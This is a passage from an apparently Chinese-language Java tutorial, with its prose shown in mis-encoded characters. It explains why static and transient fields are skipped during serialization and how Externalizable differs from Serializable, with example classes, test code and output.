handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// å°† objVals æ•°ç»„ä¸­çš„éåŸºæœ¬ç±»å‹å­—æ®µçš„å€¼è®¾ç½®åˆ°å¯¹è±¡çš„ç›¸åº”å­—æ®µä¸­</span></span><br><span class="line">        desc.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Serializable</code> æ¥å£ä¹‹æ‰€ä»¥å®šä¹‰ä¸ºç©ºï¼Œæ˜¯å› ä¸ºå®ƒåªèµ·åˆ°äº†ä¸€ä¸ªæ ‡è¯†çš„ä½œç”¨ï¼Œå‘Šè¯‰ç¨‹åºå®ç°äº†å®ƒçš„å¯¹è±¡æ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œä½†çœŸæ­£åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ“ä½œå¹¶ä¸éœ€è¦å®ƒæ¥å®Œæˆã€‚</p><h3 id="03ã€å†æ¥ç‚¹æ³¨æ„äº‹é¡¹"><a href="#03ã€å†æ¥ç‚¹æ³¨æ„äº‹é¡¹" class="headerlink" title="03ã€å†æ¥ç‚¹æ³¨æ„äº‹é¡¹"></a>03ã€å†æ¥ç‚¹æ³¨æ„äº‹é¡¹</h3><p>å¼€é—¨è§å±±çš„è¯´å§ï¼Œ<a href="https://javabetter.cn/oo/static.html"><code>static</code></a> å’Œ <a href="https://javabetter.cn/io/transient.html"><code>transient</code></a> ä¿®é¥°çš„å­—æ®µæ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–çš„ã€‚<br>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬å…ˆæ¥è¯æ˜ï¼Œå†æ¥è§£é‡ŠåŸå› ã€‚<br>é¦–å…ˆï¼Œåœ¨ <code>Wanger</code> ç±»ä¸­å¢åŠ ä¸¤ä¸ªå­—æ®µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="string">&quot;æ²‰é»˜&quot;</span>;</span><br><span class="line">    <span class="keyword">transient</span> <span class="type">String</span> <span class="variable">meizi</span> <span class="operator">=</span> <span class="string">&quot;ç‹ä¸‰&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wanger&#123;&quot;</span> + <span class="string">&quot;name=&quot;</span> + name + <span class="string">&quot;,age=&quot;</span> + age + <span class="string">&quot;,pre=&quot;</span> + pre + <span class="string">&quot;,meizi=&quot;</span> + meizi + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶æ¬¡ï¼Œåœ¨æµ‹è¯•ç±»ä¸­æ‰“å°åºåˆ—åŒ–å‰å’Œååºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œå¹¶åœ¨åºåˆ—åŒ–åå’Œååºåˆ—åŒ–å‰æ”¹å˜ <code>static</code> å­—æ®µçš„å€¼ã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;ç‹äºŒ&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠå¯¹è±¡å†™åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));)&#123;</span><br><span class="line">        oos.writeObject(wanger);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// æ”¹å˜ static å­—æ®µçš„å€¼</span></span><br><span class="line">Wanger.pre =<span class="string">&quot;ä¸æ²‰é»˜&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»æ–‡ä»¶ä¸­è¯»å‡ºå¯¹è±¡</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));)&#123;</span><br><span class="line">    <span class="type">Wanger</span> <span class="variable">wanger1</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">    System.out.println(wanger1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wanger&#123;name=ç‹äºŒ,age=18,pre=æ²‰é»˜,meizi=ç‹ä¸‰&#125;</span><br><span class="line">Wanger&#123;name=ç‹äºŒ,age=18,pre=ä¸æ²‰é»˜,meizi=null&#125;</span><br></pre></td></tr></table></figure><p>ä»ç»“æœçš„å¯¹æ¯”å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼š</p><p>1ï¼‰åºåˆ—åŒ–å‰ï¼Œ<code>pre</code> çš„å€¼ä¸ºâ€œæ²‰é»˜â€ï¼Œåºåˆ—åŒ–åï¼Œ<code>pre</code> çš„å€¼ä¿®æ”¹ä¸ºâ€œä¸æ²‰é»˜â€ï¼Œååºåˆ—åŒ–åï¼Œ<code>pre</code> çš„å€¼ä¸ºâ€œä¸æ²‰é»˜â€ï¼Œè€Œä¸æ˜¯åºåˆ—åŒ–å‰çš„çŠ¶æ€â€œæ²‰é»˜â€ã€‚<br>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºåºåˆ—åŒ–ä¿å­˜çš„æ˜¯å¯¹è±¡çš„çŠ¶æ€ï¼Œè€Œ <code>static</code> ä¿®é¥°çš„å­—æ®µå±äºç±»çš„çŠ¶æ€ï¼Œå› æ­¤å¯ä»¥è¯æ˜åºåˆ—åŒ–å¹¶ä¸ä¿å­˜ <code>static</code> ä¿®é¥°çš„å­—æ®µã€‚</p><p>2ï¼‰åºåˆ—åŒ–å‰ï¼Œ<code>meizi</code> çš„å€¼ä¸ºâ€œç‹ä¸‰â€ï¼Œååºåˆ—åŒ–åï¼Œ<code>meizi</code> çš„å€¼ä¸º <code>null</code>ï¼Œè€Œä¸æ˜¯åºåˆ—åŒ–å‰çš„çŠ¶æ€â€œç‹ä¸‰â€ã€‚<br>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<code>transient</code> çš„ä¸­æ–‡å­—ä¹‰ä¸ºâ€œä¸´æ—¶çš„â€ï¼ˆè®ºè‹±è¯­çš„é‡è¦æ€§ï¼‰ï¼Œå®ƒå¯ä»¥é˜»æ­¢å­—æ®µè¢«åºåˆ—åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œåœ¨è¢«ååºåˆ—åŒ–åï¼Œ<code>transient</code> å­—æ®µçš„å€¼è¢«è®¾ä¸ºåˆå§‹å€¼ï¼Œæ¯”å¦‚ <code>int</code> å‹çš„åˆå§‹å€¼ä¸º 0ï¼Œå¯¹è±¡å‹çš„åˆå§‹å€¼ä¸º <code>null</code>ã€‚</p><p>å¦‚æœæƒ³è¦æ·±ç©¶æºç çš„è¯ï¼Œä½ å¯ä»¥åœ¨ <code>ObjectStreamClass</code> ä¸­å‘ç°ä¸‹é¢è¿™æ ·çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectStreamField[] getDefaultSerialFields(Class&lt;?&gt; cl) &#123;</span><br><span class="line">    <span class="comment">// è·å–è¯¥ç±»ä¸­å£°æ˜çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line">    Field[] clFields = cl.getDeclaredFields();</span><br><span class="line">    ArrayList&lt;ObjectStreamField&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> Modifier.STATIC | Modifier.TRANSIENT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰å­—æ®µï¼Œå°†é static å’Œ transient çš„å­—æ®µæ·»åŠ åˆ° list ä¸­</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; clFields.length; i++) &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clFields[i];</span><br><span class="line">        <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> field.getModifiers();</span><br><span class="line">        <span class="keyword">if</span> ((mods &amp; mask) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// æ ¹æ®å­—æ®µåã€å­—æ®µç±»å‹å’Œå­—æ®µæ˜¯å¦å¯åºåˆ—åŒ–åˆ›å»ºä¸€ä¸ª ObjectStreamField å¯¹è±¡</span></span><br><span class="line">            <span class="type">ObjectStreamField</span> <span class="variable">osf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>(field.getName(), field.getType(), !Serializable.class.isAssignableFrom(cl));</span><br><span class="line">            list.add(osf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> list.size();</span><br><span class="line">    <span class="comment">// å¦‚æœ list ä¸ºç©ºï¼Œåˆ™è¿”å›ä¸€ä¸ªç©ºçš„ ObjectStreamField æ•°ç»„ï¼Œå¦åˆ™å°† list è½¬æ¢ä¸º ObjectStreamField æ•°ç»„å¹¶è¿”å›</span></span><br><span class="line">    <span class="keyword">return</span> (size == <span class="number">0</span>) ? NO_FIELDS :</span><br><span class="line">        list.toArray(<span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>[size]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ° <code>Modifier.STATIC | Modifier.TRANSIENT</code> äº†å§ï¼Œè¿™ä¸¤ä¸ªä¿®é¥°ç¬¦æ ‡è®°çš„å­—æ®µå°±æ²¡æœ‰è¢«æ”¾å…¥åˆ°åºåˆ—åŒ–çš„å­—æ®µä¸­ï¼Œæ˜ç™½äº†å§ï¼Ÿ</p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆ static å˜é‡ä¸ä¼šè¢«åºåˆ—åŒ–å‘¢ï¼ŒåŸºäºä»€ä¹ˆåŸå› ï¼Ÿ<br>static å˜é‡å±äºç±»çº§åˆ«çš„å˜é‡ï¼Œè€Œä¸æ˜¯å®ä¾‹çº§åˆ«çš„ã€‚è¿™æ„å‘³ç€ static å˜é‡æ˜¯ä¸ç±»ç›¸å…³è”çš„ï¼Œè€Œä¸æ˜¯ä¸ç±»çš„æŸä¸ªç‰¹å®šå®ä¾‹ç›¸å…³è”ã€‚æ‰€æœ‰å®ä¾‹å…±äº«åŒä¸€ static å˜é‡çš„å•ä¸€å‰¯æœ¬ã€‚å› æ­¤ï¼Œåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œåºåˆ—åŒ–æœºåˆ¶åªå…³æ³¨å¯¹è±¡çš„å®ä¾‹çŠ¶æ€ï¼Œè€Œä¸æ˜¯ç±»çš„çŠ¶æ€ã€‚<br>åºåˆ—åŒ–çš„ä¸»è¦ç›®çš„æ˜¯ä¿å­˜å¯¹è±¡çš„çŠ¶æ€ï¼Œä»¥ä¾¿å¯ä»¥åœ¨ç¨åçš„æ—¶é—´ç‚¹æˆ–åœ¨ä¸åŒçš„ JVM ç¯å¢ƒä¸­é‡æ„å¯¹è±¡ã€‚static å˜é‡çš„å€¼æ˜¯ç‹¬ç«‹äºå¯¹è±¡å®ä¾‹çš„ï¼Œå¹¶ä¸”å®ƒçš„ç”Ÿå‘½å‘¨æœŸè·¨è¶Šå•ä¸ªå®ä¾‹ã€‚å¦‚æœåºåˆ—åŒ– static å˜é‡ï¼Œé‚£ä¹ˆæ¯æ¬¡ååºåˆ—åŒ–æ—¶éƒ½å¯èƒ½è¦†ç›–æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„å½“å‰çŠ¶æ€ï¼Œè¿™å¯èƒ½å¯¼è‡´ä¸å¯é¢„è§çš„è¡Œä¸ºã€‚<br>å¦‚æœ static å˜é‡è¢«åŒ…å«åœ¨åºåˆ—åŒ–ä¸­ï¼Œæ¯ä¸ªååºåˆ—åŒ–çš„å¯¹è±¡éƒ½å¯èƒ½å°è¯•ä¿®æ”¹è¿™ä¸€ static å˜é‡ï¼Œè¿™å°†è¿å static å˜é‡çš„è®¾è®¡åˆè¡·â€”â€”æä¾›ä¸€ä¸ªå…¨å±€è®¿é—®ç‚¹ä¸”çŠ¶æ€ä¸€è‡´çš„å˜é‡ã€‚è¿™ç§è®¾è®¡å¯ä»¥ç¡®ä¿åœ¨ç±»çš„æ‰€æœ‰å®ä¾‹ä¹‹é—´å…±äº«åŒä¸€ä¸ªæ•°æ®ã€‚</p><p>transient å…³é”®å­—ç”¨äºä¿®é¥°ç±»çš„æˆå‘˜å˜é‡ï¼Œåœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œè¢«ä¿®é¥°çš„æˆå‘˜å˜é‡ä¸ä¼šè¢«åºåˆ—åŒ–å’Œä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚å…¶ä½œç”¨æ˜¯å‘Šè¯‰ JVM åœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ä¸éœ€è¦å°†è¯¥å˜é‡çš„å€¼æŒä¹…åŒ–ï¼Œè¿™æ ·å¯ä»¥é¿å…ä¸€äº›å®‰å…¨æˆ–è€…æ€§èƒ½é—®é¢˜ã€‚ä½†æ˜¯ï¼Œtransient ä¿®é¥°çš„æˆå‘˜å˜é‡åœ¨ååºåˆ—åŒ–æ—¶ä¼šè¢«åˆå§‹åŒ–ä¸ºå…¶é»˜è®¤å€¼ï¼ˆå¦‚ int ç±»å‹ä¼šè¢«åˆå§‹åŒ–ä¸º 0ï¼Œå¼•ç”¨ç±»å‹ä¼šè¢«åˆå§‹åŒ–ä¸º nullï¼‰ï¼Œå› æ­¤éœ€è¦åœ¨ç¨‹åºä¸­è¿›è¡Œé€‚å½“çš„å¤„ç†ã€‚</p><p>transient å…³é”®å­—å’Œ static å…³é”®å­—éƒ½å¯ä»¥ç”¨æ¥ä¿®é¥°ç±»çš„æˆå‘˜å˜é‡ã€‚å…¶ä¸­ï¼Œtransient å…³é”®å­—è¡¨ç¤ºè¯¥æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œè€Œ static å…³é”®å­—è¡¨ç¤ºè¯¥æˆå‘˜å˜é‡æ˜¯å±äºç±»çš„ï¼Œä¸å±äºå¯¹è±¡çš„ï¼Œå› æ­¤ä¸éœ€è¦åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><p>åœ¨ Serializable å’Œ Externalizable æ¥å£ä¸­ï¼Œtransient å…³é”®å­—çš„è¡¨ç°ä¹Ÿä¸åŒï¼Œåœ¨ Serializable ä¸­è¡¨ç¤ºè¯¥æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œåœ¨ Externalizable ä¸­ä¸èµ·ä½œç”¨ï¼Œå› ä¸º Externalizable æ¥å£éœ€è¦å®ç° readExternal å’Œ writeExternal æ–¹æ³•ï¼Œéœ€è¦æ‰‹åŠ¨å®Œæˆåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p><h3 id="04ã€å†æ¥ç‚¹å¹²è´§"><a href="#04ã€å†æ¥ç‚¹å¹²è´§" class="headerlink" title="04ã€å†æ¥ç‚¹å¹²è´§"></a>04ã€å†æ¥ç‚¹å¹²è´§</h3><p>é™¤äº† <code>Serializable</code> ä¹‹å¤–ï¼ŒJava è¿˜æä¾›äº†ä¸€ä¸ªåºåˆ—åŒ–æ¥å£ <code>Externalizable</code>ï¼ˆå¿µèµ·æ¥æœ‰ç‚¹æ‹—å£ï¼‰ã€‚</p><p>ä¸¤ä¸ªæ¥å£æœ‰ä»€ä¹ˆä¸ä¸€æ ·çš„å—ï¼Ÿè¯•ä¸€è¯•å°±çŸ¥é“äº†ã€‚</p><p>é¦–å…ˆï¼ŒæŠŠ <code>Wanger</code> ç±»å®ç°çš„æ¥å£  <code>Serializable</code> æ›¿æ¢ä¸º <code>Externalizable</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Wanger</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Wanger&#123;&quot;</span> + <span class="string">&quot;name=&quot;</span> + name + <span class="string">&quot;,age=&quot;</span> + age + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç° <code>Externalizable</code> æ¥å£çš„ <code>Wanger</code> ç±»å’Œå®ç° <code>Serializable</code> æ¥å£çš„ <code>Wanger</code> ç±»æœ‰ä¸€äº›ä¸åŒï¼š</p><p>1ï¼‰æ–°å¢äº†ä¸€ä¸ªæ— å‚çš„æ„é€ æ–¹æ³•ã€‚</p><p>ä½¿ç”¨ <code>Externalizable</code> è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨è¢«åºåˆ—åŒ–ç±»çš„æ— å‚æ„é€ æ–¹æ³•å»åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œç„¶åå†å°†è¢«ä¿å­˜å¯¹è±¡çš„å­—æ®µå€¼å¤åˆ¶è¿‡å»ã€‚å¦åˆ™çš„è¯ï¼Œä¼šæŠ›å‡ºä»¥ä¸‹å¼‚å¸¸ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: com.cmower.java_demo.xuliehua1.Wanger; no valid constructor</span><br><span class="line">at java.io.ObjectStreamClass$ExceptionInfo.newInvalidClassException(ObjectStreamClass.java:150)</span><br><span class="line">at java.io.ObjectStreamClass.checkDeserialize(ObjectStreamClass.java:790)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1782)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1353)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:373)</span><br><span class="line">at com.cmower.java_demo.xuliehua1.Test.main(Test.java:27)</span><br></pre></td></tr></table></figure><p>2ï¼‰æ–°å¢äº†ä¸¤ä¸ªæ–¹æ³• <code>writeExternal()</code> å’Œ <code>readExternal()</code>ï¼Œå®ç° <code>Externalizable</code> æ¥å£æ‰€å¿…é¡»çš„ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬å†åœ¨æµ‹è¯•ç±»ä¸­æ‰“å°åºåˆ—åŒ–å‰å’Œååºåˆ—åŒ–åçš„å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;ç‹äºŒ&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠå¯¹è±¡å†™åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));) &#123;</span><br><span class="line">oos.writeObject(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»æ–‡ä»¶ä¸­è¯»å‡ºå¯¹è±¡</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));) &#123;</span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger1</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">System.out.println(wanger1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Wanger&#123;name=ç‹äºŒ,age=18&#125;</span></span><br><span class="line"><span class="comment">// Wanger&#123;name=null,age=0&#125;</span></span><br></pre></td></tr></table></figure><p>ä»è¾“å‡ºçš„ç»“æœçœ‹ï¼Œååºåˆ—åŒ–åå¾—åˆ°çš„å¯¹è±¡å­—æ®µéƒ½å˜æˆäº†é»˜è®¤å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåºåˆ—åŒ–ä¹‹å‰çš„å¯¹è±¡çŠ¶æ€æ²¡æœ‰è¢«â€œå†»ç»“â€ä¸‹æ¥ã€‚</p><p>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬æ²¡æœ‰ä¸º <code>Wanger</code> ç±»é‡å†™å…·ä½“çš„ <code>writeExternal()</code> å’Œ <code>readExternal()</code> æ–¹æ³•ã€‚é‚£è¯¥æ€ä¹ˆé‡å†™å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">out.writeObject(name);</span><br><span class="line">out.writeInt(age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">name = (String) in.readObject();</span><br><span class="line">age = in.readInt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ï¼‰è°ƒç”¨ <code>ObjectOutput</code> çš„ <code>writeObject()</code> æ–¹æ³•å°†å­—ç¬¦ä¸²ç±»å‹çš„ <code>name</code> å†™å…¥åˆ°è¾“å‡ºæµä¸­ï¼›<br>2ï¼‰è°ƒç”¨ <code>ObjectOutput</code> çš„ <code>writeInt()</code> æ–¹æ³•å°†æ•´å‹çš„ <code>age</code> å†™å…¥åˆ°è¾“å‡ºæµä¸­ï¼›<br>3ï¼‰è°ƒç”¨ <code>ObjectInput</code> çš„ <code>readObject()</code> æ–¹æ³•å°†å­—ç¬¦ä¸²ç±»å‹çš„ <code>name</code> è¯»å…¥åˆ°è¾“å…¥æµä¸­ï¼›<br>4ï¼‰è°ƒç”¨ <code>ObjectInput</code> çš„ <code>readInt()</code> æ–¹æ³•å°†å­—ç¬¦ä¸²ç±»å‹çš„ <code>age</code> 